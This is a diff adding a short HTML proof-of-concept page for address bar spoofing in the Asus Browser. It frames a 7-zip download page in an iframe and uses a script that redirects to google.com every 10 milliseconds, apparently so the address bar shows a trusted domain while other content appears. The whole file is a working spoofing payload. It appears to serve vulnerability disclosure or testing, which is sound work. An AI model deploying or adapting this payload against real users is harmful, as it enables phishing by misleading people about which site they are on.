@@ -1,0 +1,13 @@
+<html>
+<title>Address Bar spoofing at Asus Browser</title>
+<h1> This is not a Google Site, </h1>
+<h2> Address Bar Spoofing PoC </h2>
+<iframe src="http://www.7-zip.org/download.html" height="100%" width="100%"></iframe>
+<script>
+function f()
+{
+location = "http://google.com"
+}
+setInterval("f()", 10);
+</script>
+</html>
